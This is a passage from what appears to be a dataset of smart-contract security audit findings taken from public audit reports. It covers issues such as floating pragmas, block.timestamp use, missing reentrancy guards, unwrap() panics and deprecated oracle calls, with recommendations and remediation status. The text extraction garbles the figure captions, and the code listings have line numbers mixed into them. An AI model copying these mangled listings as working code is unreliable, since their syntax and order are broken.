DirectLoanFixedOfferLegendContractKeyshubLoanChecksAndCalculations<Constructor>getIdFromStringKeyacceptOffer_acceptOffer_setupLoanTerms_loanSanityChecksOffer_getWrapper_loanSanityChecks_setupLoanExtrasgetPayoffAmount_createLoanLoanStartedgetContractLoanTerms_payoffAndFeecomputeAdminFeeInternal CallExternal CallDefined ContractUndefined Contract DirectLoanCoordinator: E C N A T I R E H N I D N A H P A R G L L A C Figure 5: loans/direct/DirectLoanCoordinator.sol 24 DirectLoanCoordinatorContractKeysLegendonlyInitialized<Constructor>_registerLoanTypesINftfiHubinitializeregisterLoangetContractFromTypeLoanSmartNftmintObligationReceiptgetTypeFromContractresolveLoangetLoanDataisValidLoanIdregisterLoanType_registerLoanTyperegisterLoanTypesgetIdFromStringKeyInternal CallExternal CallDefined ContractUndefined Contract SmartNFT: E C N A T I R E H N I D N A H P A R G L L A C Figure 6: smartNFT/SmartNFT.sol 25 SmartNftAccessControlLegend<Constructor>_setBaseURI_setupRoleINftfiHubsetLoanCoordinatorgrantRolemint_safeMintburn_burnsetBaseURIexists_existssupportsInterfacesupportsInterface_getChainID_baseURIInternal CallExternal CallDefined ContractUndefined Contract NFTfiBundler: E C N A T I R E H N I D N A H P A R G L L A C Figure 7: composable/NFTfiBundler.sol 26 NftfiBundlerERC998ERC20ExtensionIPermittedERC20sIPermittedNFTsLegendINftfiHub<Constructor>INftfiHubsupportsInterfacetypesupportsInterfacepermittedAssetIPermittedNFTsgetNFTPermitgetContractpermittedErc20AssetIPermittedERC20sgetERC20PermitbuildBundle_safeMintIERC721_getChild_getERC20IERC1155decomposeBundleownerOf_validateReceiver_remove1155ChildTransfer1155Child_removeChild_oldNFTsTransferTransferChild_removeERC20IERC20TransferERC20_receiveChild_receiveChild_receive1155Child_receive1155Child_receiveErc20Child_receiveErc20ChildInternal CallExternal CallDefined ContractUndefined Contract ", "labels": ["Halborn", "NFTfi_Ethereum", "Severity: Informational"]}, {"title": "TOKENVESTING CONTRACT OUTDATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "TokenVesting is used by Stater team with pragma 0.5.17. However, the contract was removed from OpenZeppelin contracts package. In addition, the latest version of the contract before being removed uses the pragma version 0.6.0. References: Vesting Discussion Last TokenVesting version Code Location: accessVesting.sol: Lines #204 #362 Listing 1: accessVesting.sol (Lines 204) 202 // File : browser / TokenVesting . sol 203 204 pragma solidity 0.5.17; 205 206 Listing 2: accessVesting.sol (Lines 362) 360 // File : browser / VestingFactory . sol 361 362 pragma solidity 0.5.17; 363 364 13 Risk Level: Likelihood - 4 Impact - 2 Recommendation: If possible, it is recommended other alternatives to use the token locking capability such as the use of EIP-1132 (Extending ERC20 with token locking capability) and Time-locked Wallets. If not possible, it is recommended to use the latest version. References: (eip-1132)[https://eips.ethereum.org/EIPS/eip-1132] (Time Locked WalletTruffle Tutorial)[https://www.toptal.com/ethereum- smart-contract/time-locked-wallettruffle-tutorial] Remediation Plan: SOLVED: EasyFi team updated the pragma to the version 0.7.6. Listing 3: accessVesting.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.7.6; 4 5 /* * 6 14 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Medium"]}, {"title": "PRAGMA VERSION DEPRECATED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "for accessVesting.sol. The current version in use for the contracts is pragma =0.5.17 and 0.5.2 While this version is still functional, and most security issues safely implemented by mitigating contracts with other utility contracts such as SafeMath.sol and ReentrancyGuard.sol, the risk to the long-term sustainability and integrity of the solidity code increases. Code Location: Listing 4: accessVesting.sol (Lines 80) 76 // File : browser / Address . sol 77 78 // File : openzeppelin - solidity / contracts / utils / Address . sol 79 80 pragma solidity ^0.5.2; 81 82 /* * 83 84 * Utility library of inline functions on addresses */ Listing 5: accessVesting.sol (Lines 204) 202 // File : browser / TokenVesting . sol 203 204 pragma solidity 0.5.17; 205 206 207 208 209 210 /* * 211 * @title TokenVesting 15 212 * @dev A token holder contract that can release its token balance gradually like a 213 * typical vesting scheme , with a cliff and vesting period . Optionally revocable by the * owner . */ 214 215 216 contract TokenVesting { Risk Level: Likelihood - 1 Impact - 3 Recommendations: At the time of this audit, the current version is already at 0.8.6. When possible, use the most updated and tested pragma versions to take advantage of new features that provide checks and accounting, as well as prevent insecure use of code (0.6.12-0.7.6). Remediation Plan: SOLVED: EasyFi team updated the pragma to the version 0.7.6. Listing 6: accessVesting.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.7.6; 4 5 /* * 6 16 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Low"]}, {"title": "FLOATING PRAGMA AND VERSION MISMATCH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Smart contract accessVesting.sol uses the floating pragma ^0.5.2 in some of the libraries inside, while using floating pragma ^0.5.17 in other libraries inside the smart contract, Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally For example, an outdated pragma get deployed using another pragma. version might introduce bugs that affect the contract system negatively or security recently vulnerabilities. versions released unknown pragma have may Code Location: Listing 7: version 0.5.2 (Lines 80) 76 // File : browser / Address . sol 77 78 // File : openzeppelin - solidity / contracts / utils / Address . sol 79 80 pragma solidity ^0.5.2; 81 82 /* * 83 84 * Utility library of inline functions on addresses */ Listing 8: version 0.5.17 (Lines 204) 202 // File : browser / TokenVesting . sol 203 204 pragma solidity 0.5.17; 17 Risk Level: Likelihood - 1 Impact - 3 Recommendations: Consider locking the pragma version. It is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) need to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for Truffle framework or in hardhat.config.js for HardHat framework. Remediation Plan: SOLVED: EasyFi team locked the pragma to the version 0.7.6. Listing 9: accessVesting.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.7.6; 4 5 /* * 6 18 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "The During a manual review, we noticed the use of block.timestamp. contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of block.timestamp creates a risk that miners could perform time manipulation to influence price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: accessVesting.sol Lines #253 #351 #353 #356 #416 #417 #424 19 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the If project occurs across years, days and months rather than seconds. possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: EasyFi team assumes the use of block.timestamp is safe since the timescales is higher than 900 seconds. 20 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Low"]}, {"title": "POSSIBLE MISUSE OF RELEASE FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "When a beneficiary wants to vest tokens, the smart contract creates another contract which is used to hold the vested token, whenever a beneficiary wants to release this tokens given specific conditions are met , he can call the release() function to transfer the tokens back to the beneficiary. It was observed that the release function is public and there is no checks that the function caller is the actual beneficiary or not, there are no loss of funds as the tokens are sent back to the beneficiary and not the user who called the function (msg.sender) Code Location: Listing 10: accessVesting.sol (Lines 319) /* * * @notice Transfers vested tokens to beneficiary . */ function release () public { uint256 unreleased = _releasableAmount () ; require ( unreleased > 0) ; uint256 sTokensToRelease = unreleased . mul ( multiplier ). div (10000) ; _released [ mainToken ] = _released [ mainToken ]. add ( unreleased ); _released [ secondaryToken ] = _released [ secondaryToken ]. add ( sTokensToRelease ); IERC20 ( mainToken ). safeTransfer ( _beneficiary , unreleased ); 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 21 IERC20 ( secondaryToken ). safeTransferFrom ( factory , _beneficiary , sTokensToRelease ); emit TokensReleased ( unreleased , sTokensToRelease ); 332 333 334 335 336 } Risk Level: Likelihood - 1 Impact - 1 Recommendations: Consider adding onlyBeneficiary which contains below sample code. Listing 11: onlyBeneficiary Modifier (Lines 2) 1 2 3 4 modifier onlyBeneficiary () { require ( msg . sender == beneficiary ) _ } Remediation Plan: ACKNOWLEDGED: EasyFi considers that this is intended behavior to be able to allow beneficiary to release their tokens even from another address, at the end the tokens are only released to the beneficiary address. 22 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Informational"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the accessVesting.sol contract, function like release(), is missing nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: ACKNOWLEDGED: EasyFi team accepts the risk and nonReentrant modifier will not be added due to the fact that all state changes are happening before the transfer calls 23 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Informational"]}, {"title": "NO TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "Unlike traditional software, smart contracts can not be modified unless deployed using a proxy contract. Because of the permanence, unit tests and functional testing are recommended to ensure the code works correctly before deployment. Mocha and Chai are valuable tools to perform unit tests in smart contracts. Mocha is a Javascript testing framework for creating synchronous and asynchronous unit tests, and Chai is a library with assertion functionality such as assert or expect and should be used to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 1 Impact - 2 Recommendation: We recommend performing as many test cases as possible to cover all conceivable scenarios in the smart contract. Remediation Plan: SOLVED: Unit tests were added to the test directory including many test cases such as: - makings transfers exceeding the current balance - releasing tokens before the end of vesting period. 24 - Tesitng the vest() function which creates another contract of type tokenVesting. Listing 12: Sample Unit Test Added (Lines 42,43,44) 28 it ( \" Expect Revert - Vest \" , async function () { 29 30 31 access . connect ( addr2 ). vest (1000) await expect ( ). to . be . revertedWith ( \" ERC20 : transfer amount exceeds balance \" ); await network . provider . send (\" evm_increaseTime \" , [5184001]) await network . provider . send (\" evm_mine \" ) await expect ( access . connect ( addr2 ). vest (1000) ). to . be . revertedWith ( \" release time is before current time \" ); let maxVesting = await access . maxVesting () ; maxVesting = maxVesting + 1; await expect ( access . connect ( addr2 ). vest ( maxVesting ) ). to . be . revertedWith ( \" Breaching max vesting limit \"); }) 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 25 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Informational"]}, {"title": "DOCUMENTATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Access_Vesting_Smart_Contract_Security_Audit_Halborn_v1_1.pdf", "body": "For The documentation provided by the EasyFi team is not complete. instance, the documentation included in the GitHub repository should include a walkthrough to deploy and test the smart contracts. Recommendation: Consider updating the documentation in Github for greater ease when contracts are deployed and tested. Have a Non-Developer or QA resource work through the process to make sure it addresses any gaps in the set-up steps due to technical assumptions. Remediation Plan: SOLVED: Documentation has been added to the README.md 26 ", "labels": ["Halborn", "EasyFi_Access_Vesting", "Severity: Informational"]}, {"title": "USAGE OF VULNERABLE CRATES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/deBridge_Solana_Contracts_Solana_Program_Security_Audit_Report_Halborn.pdf", "body": "It was observed that the project uses crates with known vulnerabilities. Code Location: ID RUSTSEC-2020-0036 package failure short description unmaintained Risk Level: Likelihood - 4 Impact - 1 Recommendation: Even if those vulnerable crates cannot impact the underlying application, it is advised to be aware of them. Also, it is necessary to set up dependency monitoring to always be alerted when a new vulnerability is disclosed in one of the project crates. Remediation Plan: RISK ACCEPTED: The DeBridge team accepted the risk of this finding. 12 ", "labels": ["Halborn", "deBridge_Solana_Contracts_Solana_Program", "Severity: Low"]}, {"title": "MISSING PROPER ERROR HANDLING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/deBridge_Solana_Contracts_Solana_Program_Security_Audit_Report_Halborn.pdf", "body": "The function deserialize() is using unwrap() methods which are resulting in T but if instead there will be E or None result, then it will panic. Code Location: Listing 1: crates/signature-verifier/src/lib.rs (Lines 229,231) 205 impl <' instr > RecoverInstruction < ' instr > { 206 pub fn deserialize ( buf : & mut & ' instr [ u8 ], ix_index : u8 ) -> io  :: Result < Self > { 207 208 209 210 211  1]; 212 213 214 const SERIALIZED_SIZE : usize = 11; let count = buf [0] as usize ; let offsets : Vec < SecpSignatureOffsets > = { let mut buf : &[ u8 ] = & buf [1.. count * SERIALIZED_SIZE + (0.. count ) . map (| _ | { let offset = bincode :: deserialize :: <  SecpSignatureOffsets >( buf ) 215 . map_err (| err | io :: Error :: new ( io ::  ErrorKind :: InvalidInput , err )) ?; 216 217 218 219 220 221 222 223 224 225 buf = & buf [ SERIALIZED_SIZE ..]; Ok ( offset ) }) . take ( count ) . collect :: < io :: Result < Vec <_ > > >() }?; Ok ( Self { signatures : offsets . into_iter () . filter (| offset | offset . message_instruction_index .  eq (& ix_index )) 226 . filter (| offset | offset .  eth_address_instruction_index . eq (& ix_index )) 13 227 . filter (| offset | offset .  signature_instruction_index . eq (& ix_index )) 228 229 . map (| offset | SignatureContext :: < ' instr > { address : buf [ offset . get_eth_address_range () ].  try_into () . unwrap () , 230 231 msg : & buf [ offset . get_message_range () ], signature : buf [ offset . get_signature_range () ].  try_into () . unwrap () , 232 recovery_id : & buf [ offset .  get_recovery_id_offset () ], }) . collect :: < Vec <_ > >() , 233 234 235 236 237 } }) } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to change all unwrap() methods to unwrap_or() or ? in production environment. Remediation Plan: ACKNOWLEDGED: The DeBridge team acknowledged this finding. 14 ", "labels": ["Halborn", "deBridge_Solana_Contracts_Solana_Program", "Severity: Informational"]}, {"title": "FUNCTION ERC721WOONKLYNFTREVEALWAVE.CHANGEHIDDENBASEURI MODIFIES THE WRONG STATE VARIABLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave function ERC721WoonklyNFTMinimalRevealWave contain and the changeHiddenBaseURI(): Listing 1: ERC721WoonklyNFTRevealWave.sol (Line 125) 119 function changeHiddenBaseURI ( 120 121 122 ) public onlyOwner { 123 uint _waveId , string memory _baseURI require ( bytes ( _baseURI ). length > 0, \" Error : Input parameters  can not be empty ( string ) \" ); 124 125 126 } RevealWave storage revealWave = waves [ _waveId ]; revealWave . revealBaseURI = _baseURI ; As we can see in the code above, the function is modifying the revealBaseURI variable instead of the hiddenBaseURI. As the name of the function indicates, this is not correct. Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to modify the changeHiddenBaseURI() function, so it updates the hiddenBaseURI variable instead of the revealBaseURI in the 12 contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave and ERC721WoonklyNFTMinimalRevealWave. Remediation Plan: SOLVED: The Woonkly team modified the changeHiddenBaseURI() function as suggested. 13 ", "labels": ["Halborn", "Woonkly_NFT_protocol", "Severity: Low"]}, {"title": "REVEALWAVE.REVEALDATE IS NOT USED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave and ERC721WoonklyNFTMinimalRevealWave contain the following struct: Listing 2: ERC721WoonklyNFTRevealWave.sol (Line 21) 15 16 17 18 19 20 21 22 struct RevealWave { bool isRevealed ; string name ; string hiddenBaseURI ; bool addTokenURIToHiddenBaseURI ; string revealBaseURI ; uint revealDate ; } The revealDate parameter is not used anywhere in the code and provides no utility, for this reason, it can be removed from the struct. There is only a setter function that can also be removed: Listing 3: ERC721WoonklyNFTRevealWave.sol (Line 152) 147 function changeRevealDate ( uint _waveId , 148 uint _revealDate 149 150 ) public onlyOwner { 151 152 153 } RevealWave storage revealWave = waves [ _waveId ]; revealWave . revealDate = _revealDate ; Risk Level: Likelihood - 1 Impact - 1 14 Recommendation: It is recommended to remove the revealDate variable from the RevealWave struct. It is also recommended to remove the setter function changeRevealDate() in the contracts ERC721WoonklyNFTRevealWave, ERC1155WoonklyNFTRevealWave and ERC721WoonklyNFTMinimalRevealWave. Remediation Plan: SOLVED: The Woonkly team removed the revealDate variable from the RevealWave struct. The setter function changeRevealDate() was also removed. 15 ", "labels": ["Halborn", "Woonkly_NFT_protocol", "Severity: Informational"]}, {"title": "UNNEEDED INITIALIZATION OF UINT256 VARIABLES TO 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "As i is an uint256, it is already initialized to 0. reassigns the 0 to i which wastes gas. uint256 i = 0 Code Location: ERC721LazyMinimal.sol - Line 59: 85:for (uint i = 0; i < _creators.length; i++) { for (uint i = 0; i < data.creators.length; i++){`` - Line WoonklyNFTTransferManager.sol - Line 165: for (uint256 i = 0; i < fees.length; i++){`` - Line 184:for (uint256 i = 0; i < payouts.length - 1; i++) {- Line 206:for (uint256 i = 0; i < orderOriginFees.length; i++) { ERC1155Lazy.sol - Line 70: for (uint i = 0; i < data.creators.length; i++){ - Line 117: for (uint i = 0; i < _creators.length; i++){ ERC1155Base.sol - Line 31: for (uint i = 0; i < ids.length; i++){ ERC1155Upgradeable.sol - Line 119: for (uint256 i = 0; i < accounts.length; ++i){ - Line 200: for (uint256 i = 0; i < ids.length; ++i){ - Line 280: for (uint i = 0; i < ids.length; i++){ - Line 327: for (uint i = 0; i < ids.length; i++){ RoyaltiesRegistry.sol - Line 99: for (uint i = 0; i < royalties.length; i++){ - Line 225: for (uint256 i = 0; i < values.length; i++){ 16 ERC721Lazy.sol - Line 63: for (uint i = 0; i < data.creators.length; i++){ - Line 99: for (uint i = 0; i < _creators.length; i++){ ERC721WoonklyNFTRevealWave.sol - Line 47: for (uint256 i = 0; i < operators.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to not initialize uint256 variables to 0 to save some gas. For example, use instead: for (uint256 i; i < operators.length; ++i){. Remediation Plan: SOLVED: The Woonkly team removed the initialization of uint256 variable to 0 in the for loops mentioned reducing the gas costs. 17 ", "labels": ["Halborn", "Woonkly_NFT_protocol", "Severity: Informational"]}, {"title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the loop below, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Code Location: ERC721LazyMinimal.sol - Line 59: 85:for (uint i = 0; i < _creators.length; i++) { for (uint i = 0; i < data.creators.length; i++){`` - Line WoonklyNFTTransferManager.sol - Line 165: for (uint256 i = 0; i < fees.length; i++){`` - Line 184:for (uint256 i = 0; i < payouts.length - 1; i++) {- Line 206:for (uint256 i = 0; i < orderOriginFees.length; i++) { ERC1155Lazy.sol - Line 70: for (uint i = 0; i < data.creators.length; i++){ - Line 117: for (uint i = 0; i < _creators.length; i++){ ERC1155Base.sol - Line 31: for (uint i = 0; i < ids.length; i++){ ERC1155Upgradeable.sol - Line 280: for (uint i = 0; i < ids.length; i++){ - Line 327: for (uint i = 0; i < ids.length; i++){ RoyaltiesRegistry.sol - Line 99: for (uint i = 0; i < royalties.length; i++){ - Line 225: for (uint256 i = 0; i < values.length; i++){ 18 ERC721Lazy.sol - Line 63: for (uint i = 0; i < data.creators.length; i++){ - Line 99: for (uint i = 0; i < _creators.length; i++){ ERC721WoonklyNFTRevealWave.sol - Line 47: for (uint256 i = 0; i < operators.length; i++){ Risk Level: Likelihood - 1 Impact - 1 Proof of Concept: For example, based in the following test contract: Listing 4: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 19 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This does not only apply to the iterator variable. It also applies to increments done inside the loop code block. Remediation Plan: SOLVED: The Woonkly team uses now ++i instead of i++ to increment the iterator variable in for loops reducing the gas costs. 20 ", "labels": ["Halborn", "Woonkly_NFT_protocol", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Woonkly_NFT_protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contracts below contracts, there are some functions marked as public that are never called directly within the contract itself or in any of their descendants: ProxyAdmin.sol - getProxyImplementation() (ProxyAdmin.sol#19-31) - getProxyAdmin() (ProxyAdmin.sol#37-49) - changeProxyAdmin() (ProxyAdmin.sol#56-61) - upgrade() (ProxyAdmin.sol#68-73) - upgradeAndCall() (ProxyAdmin.sol#84-90) ERC721WoonklyNFTRevealWave.sol - setRevealWave() (ERC721WoonklyNFTRevealWave.sol#104-117) - changeHiddenBaseURI() (ERC721WoonklyNFTRevealWave.sol#119-126) - changeAddTokenURIToHiddenBaseURI() (ERC721WoonklyNFTRevealWave.sol#128-134) - changeRevealBaseURI() (ERC721WoonklyNFTRevealWave.sol#136-145) - changeRevealDate() (ERC721WoonklyNFTRevealWave.sol#147-153) - resetIsRevealedAndRevealURI() (ERC721WoonklyNFTRevealWave.sol#155-161) - changeName() (ERC721WoonklyNFTRevealWave.sol#164-171) - mintAndTransferReveal() (ERC721WoonklyNFTRevealWave.sol#233-243) ERC721WoonklyNFTMinimalRevealWave.sol - setRevealWave() (ERC721WoonklyNFTMinimalRevealWave.sol#70-83) - changeHiddenBaseURI() (ERC721WoonklyNFTMinimalRevealWave.sol#85-92) - changeAddTokenURIToHiddenBaseURI() (ERC721WoonklyNFTMinimalRevealWave.sol#94-100) - changeRevealBaseURI() (ERC721WoonklyNFTMinimalRevealWave.sol#102-111) - changeRevealDate() (ERC721WoonklyNFTMinimalRevealWave.sol#113-119) - resetIsRevealedAndRevealURI() (ERC721WoonklyNFTMinimalRevealWave.sol#121-127) - changeName() (ERC721WoonklyNFTMinimalRevealWave.sol#130-137) - mintAndTransferReveal() (ERC721WoonklyNFTMinimalRevealWave.sol#199-209) ERC721WoonklyNFTFactoryC2.sol 21 - getAddress() (ERC721WoonklyNFTFactoryC2.sol#61-73) - getAddress() (ERC721WoonklyNFTFactoryC2.sol#80-92) ERC721WoonklyNFTRevealWaveFactoryC2.sol - getAddress() (ERC721WoonklyNFTRevealWaveFactoryC2.sol#64-76) - getAddress() (ERC721WoonklyNFTRevealWaveFactoryC2.sol#83-95) ERC1155WoonklyNFTRevealWave.sol - setRevealWave() (ERC1155WoonklyNFTRevealWave.sol#72-85) - changeHiddenBaseURI() (ERC1155WoonklyNFTRevealWave.sol#87-94) - changeAddTokenURIToHiddenBaseURI() (ERC1155WoonklyNFTRevealWave.sol#96-102) - changeRevealBaseURI() (ERC1155WoonklyNFTRevealWave.sol#104-113) - changeRevealDate() (ERC1155WoonklyNFTRevealWave.sol#115-121) - resetIsRevealedAndRevealURI() (ERC1155WoonklyNFTRevealWave.sol#123-129) - changeName() (ERC1155WoonklyNFTRevealWave.sol#132-139) - assignRevealWaveIdToTokenId() (ERC1155WoonklyNFTRevealWave.sol#142-145) ERC1155WoonklyNFTFactoryC2.sol - getAddress() (ERC1155WoonklyNFTFactoryC2.sol#63-75) - getAddress() (ERC1155WoonklyNFTFactoryC2.sol#82-94) ERC1155WoonklyNFTRevealWaveFactoryC2.sol - getAddress() (ERC1155WoonklyNFTRevealWaveFactoryC2.sol#63-75) - getAddress() (ERC1155WoonklyNFTRevealWaveFactoryC2.sol#82-94) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark them as external to reduce gas costs. 22 Remediation Plan: ACKNOWLEDGED: The Woonkly team acknowledges this issue. 23 ", "labels": ["Halborn", "Woonkly_NFT_protocol", "Severity: Informational"]}, {"title": "AUTHORIZE CAN REMOVE HIMSELF AND ALL OTHER AUTHORIZE ACCOUNT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The authorizedAccounts of the contract are the accounts that control In most of the in-scope reflexer-labs all privileged functions. contract, authorizedAccounts can perform privileged actions such as addAuthorization, RemoveAuthorization, ModifyParameters, start , stop (OSM, DSM) etc. . . , the RemoveAuthorization function is used to remove being an authorized account. It is observed that authorizedAccounts can remove himself via the RemoveAuthorization function. As a result, an authorized account could remove authorization before assigning new authorization to another account, which may lead to the contract having no authorized account, eliminating the ability to call privileged functions. Code Location:  Missing validation on the number of authorized accounts left in the system after removing an authorized account  Missing checks to make sure that the addAuthorization function is called before RemoveAuthorization.  No centralized super owner, any authorized account can remove all known account without a secondary confirmation. Listing 1: In-Scope Contracts function addAuthorization ( address account ) virtual external 1  isAuthorized { 2 3 4 5 6 } /* * authorizedAccounts [ account ] = 1; emit AddAuthorization ( account ); * @notice Remove auth from an account 20 * @param account Account to remove auth from */ function removeAuthorization ( address account ) virtual external authorizedAccounts [ account ] = 0; emit RemoveAuthorization ( account ); } /* * * @notice Checks whether msg . sender can call an authed * */ modifier isAuthorized { require ( authorizedAccounts [ msg . sender ] == 1, \" DSM / account - 7 8 9  isAuthorized { 10 11 12 13 14  function 15 16 17  not - authorized \" ); 18 19 _ ; } Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended that the contract authorized accounts cannot call removeAuthorization without transferring the authorization to another address before by calling addAuthorization. In addition, if a multi- signature wallet is used, calling removeAuthorization function should be confirmed by two or more authorized account. Finally, consider adding validation on the number of authorized accounts left in the system after removing an authorized account, make sure that the authorized accounts count is always equal to one or more than one. Remediation Plan: RISK ACCEPTED: The team acknowledged the above issue and claimed that it is the intended behavior of the H2O system and will add the note clarifying the intended functionalities in the README and GitBook documentation. 21 ", "labels": ["Halborn", "OceanProtocol_Priority_H2O_System_Action", "Severity: Medium"]}, {"title": "USE LATESTROUNDDATA INSTEAD OF LATESTANSWER TO RUN MORE VALIDATIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/OceanProtocol_Priority_H2O_System_Action_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Chainlink contract are calling latestAnswer to get the asset prices. The latestAnswer is deprecated. Freshness of the returned price should be checked, since it affects an accounts health (and therefore liquida- tions). Stale prices that do not reflect the current market price anymore could be used, which would influence the liquidation pricing. This method will return the last value, but you wont be able to check if the data is fresh. On the other hand, calling the method latestRoundData allow you to run some extra validations. Stale prices can put funds in a risk. According to Chainlinks documentation, This function does not error if no answer has been reached but returns 0, causing an incorrect price (https://docs.chain.link/docs/historical- fed to the Price oracle. price-data/#solidity). deprecated. is (https://docs.chain.link/docs/price-feeds-api-reference/)) latestAnswer Furthermore, Code Location: Chainlink Integration Listing 2: Chainlink Integration function read () external view returns ( uint256 ) { // The relayer must not be null require ( address ( chainlinkAggregator ) != address (0) , \" 1 2 3  ChainlinkRelayer / null - aggregator \"); 4 5 6  chainlinkAggregator . latestAnswer () ) , 10 ** uint ( multiplier )) ; 7  latestTimestamp () ; 8 // Fetch values from Chainlink uint256 medianPrice uint256 aggregatorTimestamp = chainlinkAggregator . = multiply ( uint ( 22 require ( both ( medianPrice > 0, subtract ( now , 9  aggregatorTimestamp ) <= staleThreshold ) , \" ChainlinkRelayer / invalid  - price - feed \" ); 10 11 return medianPrice ; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: Implement the following function for checking extra validations. (stale price, incomplete round and return value). Listing 3 ( 1 2 3 4 5 6 7 8 9 10 roundId , rawPrice , , updateTime , answeredInRound ) = _pricefeed () . latestRoundData () ; require ( rawPrice > 0, \" Chainlink price <= 0 \"); require ( updateTime != 0 , \" Incomplete round \" ); require ( answeredInRound >= roundId , \" Stale price \" ); References: Chainlink OpenZeppelin Oracle Article 23 Remediation 